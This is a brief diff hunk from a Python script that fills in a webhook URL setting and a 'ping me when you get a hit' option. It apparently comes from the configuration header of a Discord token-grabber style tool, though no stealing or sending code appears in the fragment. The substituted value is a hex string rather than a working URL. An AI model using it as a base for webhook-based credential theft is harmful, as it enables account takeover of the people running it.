@@ -3,7 +3,7 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "10334ed2a5fb35df1b30d7754623aa72ce5f35c6"
 
 # mentions you when you get a hit
 PING_ME = False
